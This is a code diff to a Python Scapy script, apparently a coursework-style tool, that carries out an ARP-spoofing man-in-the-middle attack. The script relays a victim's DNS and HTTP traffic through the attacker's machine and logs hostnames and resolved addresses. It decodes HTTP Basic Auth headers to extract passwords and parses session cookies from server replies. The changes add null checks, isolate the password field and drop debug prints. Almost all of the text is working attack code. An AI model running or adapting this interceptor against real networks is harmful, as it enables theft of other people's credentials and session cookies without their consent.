@@ -5,6 +5,8 @@ import sys
 import threading
 import time
 import base64
+import os
+import re
 
 def parse_arguments():
 	parser = argparse.ArgumentParser()
@@ -57,23 +59,25 @@ def interceptor(packet):
 	global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
 	if(packet.haslayer(IP)):
 		# DNS request
-		if(packet[IP].dst == dnsServerIP and packet[IP].src == clientIP):
+		if(packet[IP].src == clientIP and packet[IP].dst == dnsServerIP):
 			if(packet.haslayer(DNS)):
 				if(packet[DNS].rd == 1):
-					hostname = ''.join(chr(i) for i in packet[DNS].qd.qname)
-					print(f"*hostname: {hostname}")
+					if(packet[DNS].qd is not None):
+						hostname = ''.join(chr(i) for i in packet[DNS].qd.qname)
+						print(f"*hostname: {hostname}")
 			packet[Ether].src = attackerMAC
 			packet[Ether].dst = dnsServerMAC
 			sendp(packet)
 		# DNS reply
-		elif(packet[IP].dst == clientIP and packet[IP].src == dnsServerIP):
+		elif(packet[IP].src == dnsServerIP and packet[IP].dst == clientIP):
 			if(packet.haslayer(DNS)):
-				print(f"*hostaddr: {packet[DNS].an.rdata}")
+				if(packet[DNS].an is not None):
+					print(f"*hostaddr: {packet[DNS].an.rdata}")
 			packet[Ether].src = attackerMAC
 			packet[Ether].dst = clientMAC
 			sendp(packet)
 		# HTTP request
-		elif(packet[IP].dst == httpServerIP and packet[IP].src == clientIP):
+		elif(packet[IP].src == clientIP and packet[IP].dst == httpServerIP):
 			if(packet.haslayer(Raw)):
 				sub = packet[Raw].load.decode('utf-8').split()
 				auth = ''
@@ -81,13 +85,13 @@ def interceptor(packet):
 					if col == 'Basic':
 						auth = base64.decodestring(sub[index+1].encode('utf-8'))
 						break
-				auth = auth.decode('utf-8')
+				auth = auth.decode('utf-8').split(':')[1]
 				print(f"*basicauth: {auth}")
 			packet[Ether].src = attackerMAC
 			packet[Ether].dst = httpServerMAC
 			sendp(packet)
 		# HTTP reply
-		elif(packet[IP].dst == clientIP and packet[IP].src == httpServerIP):
+		elif(packet[IP].src == httpServerIP and packet[IP].dst == clientIP):
 			if(packet.haslayer(Raw)):
 				sub = packet[Raw].load.decode('utf-8').split()
 				cookie = ''
@@ -117,7 +121,6 @@ if __name__ == "__main__":
 	httpServerMAC = mac(httpServerIP)
 	dnsServerMAC = mac(dnsServerIP)
 	attackerMAC = get_if_hwaddr(args.interface)
-	print("mac successful")
 
 	# start a new thread to ARP spoof in a loop
 	spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
@@ -131,7 +134,6 @@ if __name__ == "__main__":
 		while True:
 			pass
 	except KeyboardInterrupt:
-		print("here")
 		restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
 		restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
 		restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
